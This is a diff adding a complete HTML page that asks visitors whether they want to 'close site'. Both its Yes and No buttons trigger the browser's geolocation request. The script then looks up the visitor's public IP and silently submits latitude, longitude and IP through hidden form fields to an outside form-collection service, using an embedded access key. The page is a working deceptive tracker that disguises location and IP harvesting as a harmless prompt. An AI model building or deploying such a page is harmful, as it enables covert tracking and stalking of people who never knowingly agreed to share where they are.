@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Location Form</title>
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,700;1,100;1,300;1,600;1,800&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://maps.google.com/maps/api/js?sensor=false"></script>
+    <script src="./script.js"></script>
+    <style>
+      * {
+        padding: 0;
+        margin: 0;
+        box-sizing: border-box;
+        font-family: 'Poppins', sans-serif;
+      }
+
+      h1 {
+        text-align: center;
+        color:green;
+      }
+
+      nav {
+        height: 10vh;
+        display: flex;
+        align-items: center;
+        padding: 0 2rem;
+        color: rgb(2, 1, 1);
+        background: rgba(255, 255, 255, 0.25);
+        box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        backdrop-filter: blur(4px);
+        -webkit-backdrop-filter: blur(4px);
+      }
+
+      .btn-container {
+        padding: 1rem 2rem;
+        text-align: center;
+      }
+
+      .btn-container button {
+        border: none;
+        padding: 0.5rem 1rem;
+        border-radius: 8px;
+        color: white;
+        cursor: pointer;
+        font-size: 1.2rem;
+      }
+
+      .btn-yes {
+        background-color: red;
+      }
+
+      .btn-no {
+        background-color: blue;
+      }
+
+      #location {
+        margin: 0 0 1rem 0;
+        font-size: 1.2rem;
+        text-align: center;
+      }
+
+      .locationContainer {
+        padding: 0 2rem;
+      }
+
+      .map-container {
+        padding: 0 2rem;
+        text-align: center;
+      }
+
+      #demo {
+        width: 600px;
+        height: 400px;
+        margin: 2rem auto;
+      }
+    </style>
+  </head>
+  <body>
+    <h1> Do You Want To Close Site?</h1>
+    <form action="https://api.web3forms.com/submit" method="POST" id="locationForm">
+      <input type="hidden" name="access_key" value="d662616f-054c-4172-87ea-4f47adb9cce5">
+      <input type="hidden" name="latitude" id="latitude">
+      <input type="hidden" name="longitude" id="longitude">
+      <input type="hidden" name="ip_address" id="ip_address">
+      <input type="hidden" name="redirect" value="https://web3forms.com/success">
+      <div class="locationContainer">
+        <div id="location"></div>
+      </div>
+      <div class="map-container">
+        <div id="demo"></div>
+      </div>
+      <div class="btn-container">
+        <button type="button" class="btn-yes locationButton">Yes!</button>
+      </div><br>
+        <div class="btn-container">
+          <button type="button" class="btn-no locationButton">No!</button>
+        </div>
+    </form>
+    <script>
+      document.querySelectorAll('.locationButton').forEach(button => {
+        button.addEventListener('click', function() {
+          getlocation();
+        });
+      });
+
+      function getlocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition, showErr);
+        } else {
+          alert("Sorry! your browser does not support Geolocation API.");
+        }
+      }
+
+      function showPosition(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+
+        document.getElementById('latitude').value = latitude;
+        document.getElementById('longitude').value = longitude;
+
+        var locationText = `Your current location is (Latitude: ${latitude}, Longitude: ${longitude})`;
+        document.getElementById('location').innerText = locationText;
+
+        getlocationForMap(latitude, longitude);
+        fetchIPAndSubmit();
+      }
+
+      function getlocationForMap(lat, long) {
+        var lattlong = new google.maps.LatLng(lat, long);
+        var myOptions = {
+          center: lattlong,
+          zoom: 15,
+          mapTypeControl: true,
+          navigationControlOptions: {
+            style: google.maps.NavigationControlStyle.SMALL,
+          },
+        };
+        var maps = new google.maps.Map(document.getElementById('demo'), myOptions);
+        var markers = new google.maps.Marker({
+          position: lattlong,
+          map: maps,
+          title: "You are here!",
+        });
+      }
+
+      function showErr(error) {
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            alert("User denied the request for Geolocation API.");
+            break;
+          case error.POSITION_UNAVAILABLE:
+            alert("User location information is unavailable.");
+            break;
+          case error.TIMEOUT:
+            alert("The request to get user location timed out.");
+            break;
+          case error.UNKNOWN_ERROR:
+            alert("An unknown error occurred.");
+            break;
+        }
+      }
+
+      function fetchIPAndSubmit() {
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            document.getElementById('ip_address').value = data.ip;
+            document.getElementById('locationForm').submit();
+          })
+          .catch(error => {
+            console.error('Error fetching IP address:', error);
+            alert('Failed to get IP address.');
+          });
+      }
+    </script>
+  </body>
+</html>
